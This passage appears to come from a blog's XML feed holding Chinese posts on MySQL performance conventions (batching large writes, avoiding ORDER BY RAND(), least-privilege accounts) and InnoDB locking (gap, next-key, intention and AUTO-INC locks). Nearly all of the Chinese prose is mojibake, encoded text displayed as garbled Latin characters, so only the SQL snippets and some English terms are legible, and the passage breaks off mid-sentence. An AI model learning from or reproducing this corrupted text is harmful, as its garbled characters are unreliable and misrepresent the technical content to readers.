å¤§å¤šæ•°æƒ…å†µä¸‹å¾ˆå°‘èƒ½åˆ©ç”¨åˆ°ç´¢å¼•ã€‚</p><h4 id="ç¦æ­¢ä½¿ç”¨-order-by-rand-è¿›è¡Œéšæœºæ’åº"><a href="#ç¦æ­¢ä½¿ç”¨-order-by-rand-è¿›è¡Œéšæœºæ’åº" class="headerlink" title="ç¦æ­¢ä½¿ç”¨ order by rand() è¿›è¡Œéšæœºæ’åº"></a>ç¦æ­¢ä½¿ç”¨ order by rand() è¿›è¡Œéšæœºæ’åº</h4><p>order by rand() ä¼šæŠŠè¡¨ä¸­æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ•°æ®è£…è½½åˆ°å†…å­˜ä¸­ï¼Œç„¶ååœ¨å†…å­˜ä¸­å¯¹æ‰€æœ‰æ•°æ®æ ¹æ®éšæœºç”Ÿæˆçš„å€¼è¿›è¡Œæ’åºï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¯¹æ¯ä¸€è¡Œéƒ½ç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶çš„æ•°æ®é›†éå¸¸å¤§ï¼Œå°±ä¼šæ¶ˆè€—å¤§é‡çš„ CPU å’Œ IO åŠå†…å­˜èµ„æºã€‚æ¨èåœ¨ç¨‹åºä¸­è·å–ä¸€ä¸ªéšæœºå€¼ï¼Œç„¶åä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„æ–¹å¼ã€‚</p><h4 id="WHERE-ä»å¥ä¸­ç¦æ­¢å¯¹åˆ—è¿›è¡Œå‡½æ•°è½¬æ¢å’Œè®¡ç®—"><a href="#WHERE-ä»å¥ä¸­ç¦æ­¢å¯¹åˆ—è¿›è¡Œå‡½æ•°è½¬æ¢å’Œè®¡ç®—" class="headerlink" title="WHERE ä»å¥ä¸­ç¦æ­¢å¯¹åˆ—è¿›è¡Œå‡½æ•°è½¬æ¢å’Œè®¡ç®—"></a>WHERE ä»å¥ä¸­ç¦æ­¢å¯¹åˆ—è¿›è¡Œå‡½æ•°è½¬æ¢å’Œè®¡ç®—</h4><p>å¯¹åˆ—è¿›è¡Œå‡½æ•°è½¬æ¢æˆ–è®¡ç®—æ—¶ä¼šå¯¼è‡´æ— æ³•ä½¿ç”¨ç´¢å¼•</p><p><strong>ä¸æ¨èï¼š</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="type">date</span>(create_time)<span class="operator">=</span><span class="string">&#x27;20190101&#x27;</span></span><br></pre></td></tr></table></figure><br><strong>æ¨èï¼š</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> create_time <span class="operator">&gt;=</span> <span class="string">&#x27;20190101&#x27;</span> <span class="keyword">and</span> create_time <span class="operator">&lt;</span> <span class="string">&#x27;20190102&#x27;</span></span><br></pre></td></tr></table></figure></p><h4 id="åœ¨æ˜æ˜¾ä¸ä¼šæœ‰é‡å¤å€¼æ—¶ä½¿ç”¨-UNION-ALL-è€Œä¸æ˜¯-UNION"><a href="#åœ¨æ˜æ˜¾ä¸ä¼šæœ‰é‡å¤å€¼æ—¶ä½¿ç”¨-UNION-ALL-è€Œä¸æ˜¯-UNION" class="headerlink" title="åœ¨æ˜æ˜¾ä¸ä¼šæœ‰é‡å¤å€¼æ—¶ä½¿ç”¨ UNION ALL è€Œä¸æ˜¯ UNION"></a>åœ¨æ˜æ˜¾ä¸ä¼šæœ‰é‡å¤å€¼æ—¶ä½¿ç”¨ UNION ALL è€Œä¸æ˜¯ UNION</h4><ul><li>UNION ä¼šæŠŠä¸¤ä¸ªç»“æœé›†çš„æ‰€æœ‰æ•°æ®æ”¾åˆ°ä¸´æ—¶è¡¨ä¸­åå†è¿›è¡Œå»é‡æ“ä½œ</li><li>UNION ALL ä¸ä¼šå†å¯¹ç»“æœé›†è¿›è¡Œå»é‡æ“ä½œ</li></ul><h4 id="æ‹†åˆ†å¤æ‚çš„å¤§-SQL-ä¸ºå¤šä¸ªå°-SQL"><a href="#æ‹†åˆ†å¤æ‚çš„å¤§-SQL-ä¸ºå¤šä¸ªå°-SQL" class="headerlink" title="æ‹†åˆ†å¤æ‚çš„å¤§ SQL ä¸ºå¤šä¸ªå° SQL"></a>æ‹†åˆ†å¤æ‚çš„å¤§ SQL ä¸ºå¤šä¸ªå° SQL</h4><ul><li>å¤§ SQL é€»è¾‘ä¸Šæ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦å ç”¨å¤§é‡ CPU è¿›è¡Œè®¡ç®—çš„ SQL</li><li>MySQL ä¸­ï¼Œä¸€ä¸ª SQL åªèƒ½ä½¿ç”¨ä¸€ä¸ª CPU è¿›è¡Œè®¡ç®—</li><li>SQL æ‹†åˆ†åå¯ä»¥é€šè¿‡å¹¶è¡Œæ‰§è¡Œæ¥æé«˜å¤„ç†æ•ˆç‡</li></ul><h4 id="ç¨‹åºè¿æ¥ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è´¦å·ï¼Œç¦æ­¢è·¨åº“æŸ¥è¯¢"><a href="#ç¨‹åºè¿æ¥ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è´¦å·ï¼Œç¦æ­¢è·¨åº“æŸ¥è¯¢" class="headerlink" title="ç¨‹åºè¿æ¥ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è´¦å·ï¼Œç¦æ­¢è·¨åº“æŸ¥è¯¢"></a>ç¨‹åºè¿æ¥ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è´¦å·ï¼Œç¦æ­¢è·¨åº“æŸ¥è¯¢</h4><ul><li>ä¸ºæ•°æ®åº“è¿ç§»å’Œåˆ†åº“åˆ†è¡¨ç•™å‡ºä½™åœ°</li><li>é™ä½ä¸šåŠ¡è€¦åˆåº¦</li><li>é¿å…æƒé™è¿‡å¤§è€Œäº§ç”Ÿçš„å®‰å…¨é£é™©</li></ul><h3 id="æ•°æ®åº“æ“ä½œè¡Œä¸ºè§„èŒƒ"><a href="#æ•°æ®åº“æ“ä½œè¡Œä¸ºè§„èŒƒ" class="headerlink" title="æ•°æ®åº“æ“ä½œè¡Œä¸ºè§„èŒƒ"></a>æ•°æ®åº“æ“ä½œè¡Œä¸ºè§„èŒƒ</h3><h4 id="è¶…-100-ä¸‡è¡Œçš„æ‰¹é‡å†™-UPDATE-DELETE-INSERT-æ“ä½œ-è¦åˆ†æ‰¹å¤šæ¬¡è¿›è¡Œæ“ä½œ"><a href="#è¶…-100-ä¸‡è¡Œçš„æ‰¹é‡å†™-UPDATE-DELETE-INSERT-æ“ä½œ-è¦åˆ†æ‰¹å¤šæ¬¡è¿›è¡Œæ“ä½œ" class="headerlink" title="è¶… 100 ä¸‡è¡Œçš„æ‰¹é‡å†™ (UPDATE,DELETE,INSERT) æ“ä½œ,è¦åˆ†æ‰¹å¤šæ¬¡è¿›è¡Œæ“ä½œ"></a>è¶… 100 ä¸‡è¡Œçš„æ‰¹é‡å†™ (UPDATE,DELETE,INSERT) æ“ä½œ,è¦åˆ†æ‰¹å¤šæ¬¡è¿›è¡Œæ“ä½œ</h4><p><strong>å¤§æ‰¹é‡æ“ä½œå¯èƒ½ä¼šé€ æˆä¸¥é‡çš„ä¸»ä»å»¶è¿Ÿ</strong></p><p>ä¸»ä»ç¯å¢ƒä¸­,å¤§æ‰¹é‡æ“ä½œå¯èƒ½ä¼šé€ æˆä¸¥é‡çš„ä¸»ä»å»¶è¿Ÿï¼Œå¤§æ‰¹é‡çš„å†™æ“ä½œä¸€èˆ¬éƒ½éœ€è¦æ‰§è¡Œä¸€å®šé•¿çš„æ—¶é—´ï¼Œè€Œåªæœ‰å½“ä¸»åº“ä¸Šæ‰§è¡Œå®Œæˆåï¼Œæ‰ä¼šåœ¨å…¶ä»–ä»åº“ä¸Šæ‰§è¡Œï¼Œæ‰€ä»¥ä¼šé€ æˆä¸»åº“ä¸ä»åº“é•¿æ—¶é—´çš„å»¶è¿Ÿæƒ…å†µ</p><p><strong>binlog æ—¥å¿—ä¸º row æ ¼å¼æ—¶ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—</strong></p><p>å¤§æ‰¹é‡å†™æ“ä½œä¼šäº§ç”Ÿå¤§é‡æ—¥å¿—ï¼Œç‰¹åˆ«æ˜¯å¯¹äº row æ ¼å¼äºŒè¿›åˆ¶æ•°æ®è€Œè¨€ï¼Œç”±äºåœ¨ row æ ¼å¼ä¸­ä¼šè®°å½•æ¯ä¸€è¡Œæ•°æ®çš„ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¸€æ¬¡ä¿®æ”¹çš„æ•°æ®è¶Šå¤šï¼Œäº§ç”Ÿçš„æ—¥å¿—é‡ä¹Ÿå°±ä¼šè¶Šå¤šï¼Œæ—¥å¿—çš„ä¼ è¾“å’Œæ¢å¤æ‰€éœ€è¦çš„æ—¶é—´ä¹Ÿå°±è¶Šé•¿ï¼Œè¿™ä¹Ÿæ˜¯é€ æˆä¸»ä»å»¶è¿Ÿçš„ä¸€ä¸ªåŸå› </p><p><strong>é¿å…äº§ç”Ÿå¤§äº‹åŠ¡æ“ä½œ</strong></p><p>å¤§æ‰¹é‡ä¿®æ”¹æ•°æ®ï¼Œä¸€å®šæ˜¯åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­è¿›è¡Œçš„ï¼Œè¿™å°±ä¼šé€ æˆè¡¨ä¸­å¤§æ‰¹é‡æ•°æ®è¿›è¡Œé”å®šï¼Œä»è€Œå¯¼è‡´å¤§é‡çš„é˜»å¡ï¼Œé˜»å¡ä¼šå¯¹ MySQL çš„æ€§èƒ½äº§ç”Ÿéå¸¸å¤§çš„å½±å“ã€‚ç‰¹åˆ«æ˜¯é•¿æ—¶é—´çš„é˜»å¡ä¼šå æ»¡æ‰€æœ‰æ•°æ®åº“çš„å¯ç”¨è¿æ¥ï¼Œè¿™ä¼šä½¿ç”Ÿäº§ç¯å¢ƒä¸­çš„å…¶ä»–åº”ç”¨æ— æ³•è¿æ¥åˆ°æ•°æ®åº“ï¼Œå› æ­¤ä¸€å®šè¦æ³¨æ„å¤§æ‰¹é‡å†™æ“ä½œè¦è¿›è¡Œåˆ†æ‰¹</p><h4 id="å¯¹äºå¤§è¡¨ä½¿ç”¨-pt-online-schema-change-ä¿®æ”¹è¡¨ç»“æ„"><a href="#å¯¹äºå¤§è¡¨ä½¿ç”¨-pt-online-schema-change-ä¿®æ”¹è¡¨ç»“æ„" class="headerlink" title="å¯¹äºå¤§è¡¨ä½¿ç”¨ pt-online-schema-change ä¿®æ”¹è¡¨ç»“æ„"></a>å¯¹äºå¤§è¡¨ä½¿ç”¨ pt-online-schema-change ä¿®æ”¹è¡¨ç»“æ„</h4><ul><li>é¿å…å¤§è¡¨ä¿®æ”¹äº§ç”Ÿçš„ä¸»ä»å»¶è¿Ÿ</li><li>é¿å…åœ¨å¯¹è¡¨å­—æ®µè¿›è¡Œä¿®æ”¹æ—¶è¿›è¡Œé”è¡¨</li></ul><p>å¯¹å¤§è¡¨æ•°æ®ç»“æ„çš„ä¿®æ”¹ä¸€å®šè¦è°¨æ…ï¼Œä¼šé€ æˆä¸¥é‡çš„é”è¡¨æ“ä½œï¼Œå°¤å…¶æ˜¯ç”Ÿäº§ç¯å¢ƒï¼Œæ˜¯ä¸èƒ½å®¹å¿çš„ã€‚</p><p><code>pt-online-schema-change</code> å®ƒä¼šé¦–å…ˆå»ºç«‹ä¸€ä¸ªä¸åŸè¡¨ç»“æ„ç›¸åŒçš„æ–°è¡¨ï¼Œå¹¶ä¸”åœ¨æ–°è¡¨ä¸Šè¿›è¡Œè¡¨ç»“æ„çš„ä¿®æ”¹ï¼Œç„¶åå†æŠŠåŸè¡¨ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–°è¡¨ä¸­ï¼Œå¹¶åœ¨åŸè¡¨ä¸­å¢åŠ ä¸€äº›è§¦å‘å™¨ã€‚æŠŠåŸè¡¨ä¸­æ–°å¢çš„æ•°æ®ä¹Ÿå¤åˆ¶åˆ°æ–°è¡¨ä¸­ï¼Œåœ¨è¡Œæ‰€æœ‰æ•°æ®å¤åˆ¶å®Œæˆä¹‹åï¼ŒæŠŠæ–°è¡¨å‘½åæˆåŸè¡¨ï¼Œå¹¶æŠŠåŸæ¥çš„è¡¨åˆ é™¤æ‰ã€‚æŠŠåŸæ¥ä¸€ä¸ª DDL æ“ä½œï¼Œåˆ†è§£æˆå¤šä¸ªå°çš„æ‰¹æ¬¡è¿›è¡Œã€‚</p><h4 id="ç¦æ­¢ä¸ºç¨‹åºä½¿ç”¨çš„è´¦å·èµ‹äºˆ-super-æƒé™"><a href="#ç¦æ­¢ä¸ºç¨‹åºä½¿ç”¨çš„è´¦å·èµ‹äºˆ-super-æƒé™" class="headerlink" title="ç¦æ­¢ä¸ºç¨‹åºä½¿ç”¨çš„è´¦å·èµ‹äºˆ super æƒé™"></a>ç¦æ­¢ä¸ºç¨‹åºä½¿ç”¨çš„è´¦å·èµ‹äºˆ super æƒé™</h4><ul><li>å½“è¾¾åˆ°æœ€å¤§è¿æ¥æ•°é™åˆ¶æ—¶ï¼Œè¿˜è¿è¡Œ 1 ä¸ªæœ‰ super æƒé™çš„ç”¨æˆ·è¿æ¥</li><li>super æƒé™åªèƒ½ç•™ç»™ DBA å¤„ç†é—®é¢˜çš„è´¦å·ä½¿ç”¨</li></ul><h4 id="å¯¹äºç¨‹åºè¿æ¥æ•°æ®åº“è´¦å·-éµå¾ªæƒé™æœ€å°åŸåˆ™"><a href="#å¯¹äºç¨‹åºè¿æ¥æ•°æ®åº“è´¦å·-éµå¾ªæƒé™æœ€å°åŸåˆ™" class="headerlink" title="å¯¹äºç¨‹åºè¿æ¥æ•°æ®åº“è´¦å·,éµå¾ªæƒé™æœ€å°åŸåˆ™"></a>å¯¹äºç¨‹åºè¿æ¥æ•°æ®åº“è´¦å·,éµå¾ªæƒé™æœ€å°åŸåˆ™</h4><ul><li>ç¨‹åºä½¿ç”¨æ•°æ®åº“è´¦å·åªèƒ½åœ¨ä¸€ä¸ª DB ä¸‹ä½¿ç”¨ï¼Œä¸å‡†è·¨åº“</li><li>ç¨‹åºä½¿ç”¨çš„è´¦å·åŸåˆ™ä¸Šä¸å‡†æœ‰ drop æƒé™</li></ul><p><strong>Reference:</strong><br> <a href="https://javaguide.cn/database/mysql/mysql-high-performance-optimization-specification-recommendations.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">MySQLé«˜æ€§èƒ½ä¼˜åŒ–è§„èŒƒå»ºè®®æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLé”</title>
      <link href="/2023/12/21/MySQL%E9%94%81/"/>
      <url>/2023/12/21/MySQL%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQLé”"><a href="#MySQLé”" class="headerlink" title="MySQLé”"></a>MySQLé”</h3><h4 id="è¡¨çº§é”å’Œè¡Œçº§é”"><a href="#è¡¨çº§é”å’Œè¡Œçº§é”" class="headerlink" title="è¡¨çº§é”å’Œè¡Œçº§é”"></a>è¡¨çº§é”å’Œè¡Œçº§é”</h4><p><strong>MyISAM</strong> (MySQL5.5ç‰ˆæœ¬ä»¥å‰é»˜è®¤çš„å­˜å‚¨å¼•æ“) ä»…ä»…æ”¯æŒè¡¨çº§é”ï¼Œä¸€é”å°±é”æ•´å¼ è¡¨ï¼Œè¿™åœ¨å¹¶å‘å†™çš„æƒ…å†µä¸‹æ€§éå¸¸å·®ã€‚</p><p><strong>InnoDB</strong> (MySQL5.5ç‰ˆæœ¬åé»˜è®¤çš„å­˜å‚¨å¼•æ“) ä¸å…‰æ”¯æŒè¡¨çº§é”ï¼Œè¿˜æ”¯æŒè¡Œçº§é”ï¼Œé»˜è®¤ä¸ºè¡Œçº§é”ã€‚è¡Œçº§é”çš„ç²’åº¦æ›´å°ï¼Œä»…å¯¹ç›¸å…³çš„è®°å½•ä¸Šé”å³å¯ï¼ˆå¯¹ä¸€è¡Œæˆ–è€…å¤šè¡Œè®°å½•åŠ é”ï¼‰ï¼Œæ‰€ä»¥å¯¹äºå¹¶å‘å†™å…¥æ“ä½œæ¥è¯´ï¼Œ InnoDB çš„æ€§èƒ½æ›´é«˜ã€‚</p><p><strong>è¡¨çº§é”å’Œè¡Œçº§é”å¯¹æ¯”ï¼š</strong></p><ul><li><p><strong>è¡¨çº§é”</strong>ï¼š MySQL ä¸­é”å®šç²’åº¦æœ€å¤§çš„ä¸€ç§é”ï¼ˆå…¨å±€é”é™¤å¤–ï¼‰ï¼Œæ˜¯é’ˆå¯¹éç´¢å¼•å­—æ®µåŠ çš„é”ï¼Œå¯¹å½“å‰æ“ä½œçš„æ•´å¼ è¡¨åŠ é”ï¼Œå®ç°ç®€å•ï¼Œèµ„æºæ¶ˆè€—ä¹Ÿæ¯”è¾ƒå°‘ï¼ŒåŠ é”å¿«ï¼Œä¸ä¼šå‡ºç°æ­»é”ã€‚ä¸è¿‡ï¼Œè§¦å‘é”å†²çªçš„æ¦‚ç‡æœ€é«˜ï¼Œé«˜å¹¶å‘ä¸‹æ•ˆç‡æä½ã€‚è¡¨çº§é”å’Œå­˜å‚¨å¼•æ“æ— å…³ï¼ŒMyISAM å’Œ InnoDB å¼•æ“éƒ½æ”¯æŒè¡¨çº§é”ã€‚</p></li><li><p><strong>è¡Œçº§é”</strong>ï¼š MySQL ä¸­é”çš„ç²’åº¦æœ€å°çš„ä¸€ç§é”ï¼Œæ˜¯ é’ˆå¯¹ç´¢å¼•å­—æ®µåŠ çš„é” ï¼Œåªé’ˆå¯¹å½“å‰æ“ä½œçš„è¡Œè®°å½•è¿›è¡ŒåŠ é”ã€‚ è¡Œçº§é”èƒ½å¤§å¤§å‡å°‘æ•°æ®åº“æ“ä½œçš„å†²çªã€‚<strong>å…¶åŠ é”ç²’åº¦æœ€å°ï¼Œå¹¶å‘åº¦é«˜ï¼Œä½†åŠ é”çš„å¼€é”€ä¹Ÿæœ€å¤§ï¼ŒåŠ é”æ…¢ï¼Œä¼šå‡ºç°æ­»é”</strong>ã€‚è¡Œçº§é”å’Œå­˜å‚¨å¼•æ“æœ‰å…³ï¼Œæ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚é¢å®ç°çš„ã€‚</p></li></ul><p>InnoDB çš„è¡Œé”æ˜¯é’ˆå¯¹ç´¢å¼•å­—æ®µåŠ çš„é”ï¼Œè¡¨çº§é”æ˜¯é’ˆå¯¹éç´¢å¼•å­—æ®µåŠ çš„é”ã€‚å½“æˆ‘ä»¬æ‰§è¡Œ UPDATEã€DELETE è¯­å¥æ—¶ï¼Œå¦‚æœ WHEREæ¡ä»¶ä¸­å­—æ®µæ²¡æœ‰å‘½ä¸­å”¯ä¸€ç´¢å¼•æˆ–è€…ç´¢å¼•å¤±æ•ˆçš„è¯ï¼Œå°±ä¼šå¯¼è‡´æ‰«æå…¨è¡¨å¯¹è¡¨ä¸­çš„æ‰€æœ‰è¡Œè®°å½•è¿›è¡ŒåŠ é”ã€‚</p><h4 id="InnoDB-æœ‰å“ªå‡ ç±»è¡Œé”ï¼Ÿ"><a href="#InnoDB-æœ‰å“ªå‡ ç±»è¡Œé”ï¼Ÿ" class="headerlink" title="InnoDB æœ‰å“ªå‡ ç±»è¡Œé”ï¼Ÿ"></a>InnoDB æœ‰å“ªå‡ ç±»è¡Œé”ï¼Ÿ</h4><p>MySQL InnoDB æ”¯æŒä¸‰ç§è¡Œé”å®šæ–¹å¼ï¼š</p><ul><li><strong>è®°å½•é”</strong>ï¼ˆRecord Lockï¼‰ï¼šå±äºå•ä¸ªè¡Œè®°å½•ä¸Šçš„é”ã€‚</li><li><strong>é—´éš™é”</strong>ï¼ˆGap Lockï¼‰ï¼šé”å®šä¸€ä¸ªèŒƒå›´ï¼Œä¸åŒ…æ‹¬è®°å½•æœ¬èº«ã€‚</li></ul><p>å‡è®¾ï¼Œè¡¨ä¸­æœ‰ä¸€ä¸ªèŒƒå›´ id ä¸ºï¼ˆ3ï¼Œ5ï¼‰é—´éš™é”ï¼Œé‚£ä¹ˆå…¶ä»–äº‹åŠ¡å°±æ— æ³•æ’å…¥ id = 4 è¿™æ¡è®°å½•äº†ï¼Œè¿™æ ·å°±æœ‰æ•ˆçš„é˜²æ­¢å¹»è¯»ç°è±¡çš„å‘ç”Ÿã€‚</p><p><img src="https://pb01.s3.bitiful.net/gap.drawio.webp" alt="avatar"></p><p>é—´éš™é”ä¹‹é—´æ˜¯å…¼å®¹çš„ï¼Œå³ä¸¤ä¸ªäº‹åŠ¡å¯ä»¥åŒæ—¶æŒæœ‰åŒ…å«å…±åŒé—´éš™èŒƒå›´çš„é—´éš™é”ï¼Œå¹¶ä¸å­˜åœ¨äº’æ–¥å…³ç³»ï¼Œå› ä¸ºé—´éš™é”çš„ç›®çš„æ˜¯é˜²æ­¢æ’å…¥å¹»å½±è®°å½•è€Œæå‡ºçš„ã€‚</p><ul><li><strong>ä¸´é”®é”</strong>ï¼ˆNext-Key Lockï¼‰ï¼šRecord Lock+Gap Lockï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼ŒåŒ…å«è®°å½•æœ¬èº«ï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è§£å†³å¹»è¯»é—®é¢˜ã€‚è®°å½•é”åªèƒ½é”ä½å·²ç»å­˜åœ¨çš„è®°å½•ï¼Œä¸ºäº†é¿å…æ’å…¥æ–°è®°å½•ï¼Œéœ€è¦ä¾èµ–é—´éš™é”ã€‚</li></ul><p>Next-Key Lock ç§°ä¸ºä¸´é”®é”ï¼Œæ˜¯ Record Lock + Gap Lock çš„ç»„åˆï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼Œå¹¶ä¸”é”å®šè®°å½•æœ¬èº«ã€‚</p><p>å‡è®¾ï¼Œè¡¨ä¸­æœ‰ä¸€ä¸ªèŒƒå›´ id ä¸º(3ï¼Œ5] çš„ next-key lockï¼Œé‚£ä¹ˆå…¶ä»–äº‹åŠ¡å³ä¸èƒ½æ’å…¥ id = 4 è®°å½•ï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹ id = 5 è¿™æ¡è®°å½•ã€‚</p><p><img src="https://pb01.s3.bitiful.net/nextkey.drawio.webp" alt="avatar"></p><p>next-key lock æ˜¯åŒ…å«é—´éš™é”+è®°å½•é”çš„ï¼Œå¦‚æœä¸€ä¸ªäº‹åŠ¡è·å–äº† X å‹çš„ next-key lockï¼Œé‚£ä¹ˆå¦å¤–ä¸€ä¸ªäº‹åŠ¡åœ¨è·å–ç›¸åŒèŒƒå›´çš„ X å‹çš„ next-key lock æ—¶ï¼Œæ˜¯ä¼šè¢«é˜»å¡çš„ã€‚</p><p>è™½ç„¶ç›¸åŒèŒƒå›´çš„é—´éš™é”æ˜¯å¤šä¸ªäº‹åŠ¡ç›¸äº’å…¼å®¹çš„ï¼Œä½†å¯¹äºè®°å½•é”ï¼Œæˆ‘ä»¬æ˜¯è¦è€ƒè™‘ X å‹ä¸ S å‹å…³ç³»ï¼ŒX å‹çš„è®°å½•é”ä¸ X å‹çš„è®°å½•é”æ˜¯å†²çªçš„ã€‚</p><p>åœ¨ InnoDB é»˜è®¤çš„éš”ç¦»çº§åˆ« <code>REPEATABLE-READ</code>(å¯é‡å¤è¯») ä¸‹ï¼Œè¡Œé”é»˜è®¤ä½¿ç”¨çš„æ˜¯ <code>Next-Key Lock</code>ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ“ä½œçš„ç´¢å¼•æ˜¯å”¯ä¸€ç´¢å¼•æˆ–ä¸»é”®ï¼ŒInnoDB ä¼šå¯¹ <code>Next-Key Lock</code> è¿›è¡Œä¼˜åŒ–ï¼Œå°†å…¶é™çº§ä¸º <code>Record Lock</code>ï¼Œå³ä»…é”ä½ç´¢å¼•æœ¬èº«ï¼Œè€Œä¸æ˜¯èŒƒå›´ã€‚</p><h4 id="æ„å‘é”"><a href="#æ„å‘é”" class="headerlink" title="æ„å‘é”"></a>æ„å‘é”</h4><p>å¦‚æœéœ€è¦ç”¨åˆ°è¡¨é”çš„è¯ï¼Œå¦‚ä½•åˆ¤æ–­è¡¨ä¸­çš„è®°å½•æ²¡æœ‰è¡Œé”å‘¢(<strong>è¡¨é”å’Œè¡Œé”æ˜¯æ»¡è¶³è¯»è¯»å…±äº«ã€è¯»å†™äº’æ–¥ã€å†™å†™äº’æ–¥çš„</strong>)ï¼Œä¸€è¡Œä¸€è¡Œéå†è‚¯å®šæ˜¯ä¸è¡Œï¼Œæ€§èƒ½å¤ªå·®ã€‚æˆ‘ä»¬éœ€è¦ç”¨åšæ„å‘é”æ¥å¿«é€Ÿåˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹æŸä¸ªè¡¨ä½¿ç”¨è¡¨é”ã€‚</p><p>æ˜¯ä¸€ç§è¡¨çº§é”ã€‚</p><p>æ„å‘é”æ˜¯ä¸€ç§è¡¨çº§é”,åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li><strong>æ„å‘å…±äº«é”</strong>ï¼ˆISï¼‰ï¼šäº‹åŠ¡æœ‰æ„å‘å¯¹è¡¨ä¸­çš„æŸäº›è®°å½•åŠ å…±äº«é”ï¼ˆS é”ï¼‰ï¼ŒåŠ å…±äº«é”å‰å¿…é¡»å…ˆå–å¾—è¯¥è¡¨çš„ IS é”</li><li><strong>æ„å‘æ’ä»–é”</strong>ï¼ˆIXï¼‰ï¼šäº‹åŠ¡æœ‰æ„å‘å¯¹è¡¨ä¸­çš„æŸäº›è®°å½•åŠ æ’ä»–é”ï¼ˆX é”ï¼‰ï¼ŒåŠ æ’ä»–é”ä¹‹å‰å¿…é¡»å…ˆå–å¾—è¯¥è¡¨çš„ IX é”</li></ul><p>æ„å‘é”æ˜¯ç”±æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤çš„ï¼Œç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œæ„å‘é”ï¼Œåœ¨ä¸ºæ•°æ®è¡ŒåŠ å…±äº«/æ’ä»–é”ä¹‹å‰ï¼ŒInooDB ä¼šå…ˆè·å–è¯¥æ•°æ®è¡Œæ‰€åœ¨åœ¨æ•°æ®è¡¨çš„å¯¹åº”æ„å‘é”ã€‚</p><p>æ„å‘é”ä¹‹é—´æ˜¯äº’ç›¸å…¼å®¹çš„:</p><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">IS é”</th><th style="text-align:center">IX é”</th></tr></thead><tbody><tr><td style="text-align:center">IS é”</td><td style="text-align:center">å…¼å®¹</td><td style="text-align:center">å…¼å®¹</td></tr><tr><td style="text-align:center">IX é”</td><td style="text-align:center">å…¼å®¹</td><td style="text-align:center">å…¼å®¹</td></tr></tbody></table></div><p>æ„å‘é”å’Œå…±äº«é”å’Œæ’å®ƒé”äº’æ–¥ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯è¡¨çº§åˆ«çš„å…±äº«é”å’Œæ’ä»–é”ï¼Œæ„å‘é”ä¸ä¼šä¸è¡Œçº§çš„å…±äº«é”å’Œæ’ä»–é”äº’æ–¥ï¼‰ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">IS é”</th><th style="text-align:center">IX é”</th></tr></thead><tbody><tr><td style="text-align:center">S é”</td><td style="text-align:center">å…¼å®¹</td><td style="text-align:center">äº’æ–¥</td></tr><tr><td style="text-align:center">X é”</td><td style="text-align:center">äº’æ–¥</td><td style="text-align:center">äº’æ–¥</td></tr></tbody></table></div><h4 id="è‡ªå¢é”"><a href="#è‡ªå¢é”" class="headerlink" title="è‡ªå¢é”"></a>è‡ªå¢é”</h4><p>è®¾ç½®<code>AUTO_INCREMENT</code>çš„åˆ—éƒ½ä¼šæ¶‰åŠåˆ°è‡ªå¢é”. </p><p>AUTO-INC é”æ˜¯ç‰¹æ®Šçš„è¡¨é”æœºåˆ¶ï¼Œé”ä¸æ˜¯åœ¨ä¸€ä¸ªäº‹åŠ¡æäº¤åæ‰é‡Šæ”¾ï¼Œè€Œæ˜¯åœ¨æ‰§è¡Œå®Œæ’å…¥è¯­å¥åå°±ä¼šç«‹å³é‡Šæ”¾ã€‚</p><p>åœ¨æ’å…¥æ•°æ®æ—¶ï¼Œä¼šåŠ ä¸€ä¸ªè¡¨çº§åˆ«çš„ AUTO-INC é”ï¼Œç„¶åä¸ºè¢« AUTO_INCREMENT ä¿®é¥°çš„å­—æ®µèµ‹å€¼(é€’å¢çš„å€¼)ï¼Œç­‰æ’å…¥è¯­å¥æ‰§è¡Œå®Œæˆåï¼Œæ‰ä¼šæŠŠ AUTO-INC é”é‡Šæ”¾æ‰ã€‚</p><p>é‚£ä¹ˆï¼Œä¸€ä¸ªäº‹åŠ¡åœ¨æŒæœ‰ AUTO-INC é”çš„è¿‡ç¨‹ä¸­ï¼Œå…¶ä»–äº‹åŠ¡çš„å¦‚æœè¦å‘è¯¥è¡¨æ’å…¥è¯­å¥éƒ½ä¼šè¢«é˜»å¡ï¼Œä»è€Œä¿è¯æ’å…¥æ•°æ®æ—¶ï¼Œè¢« AUTO_INCREMENT ä¿®é¥°çš„å­—æ®µçš„å€¼æ˜¯è¿ç»­é€’å¢çš„ã€‚</p><p>ä½†æ˜¯ï¼Œ AUTO-INC 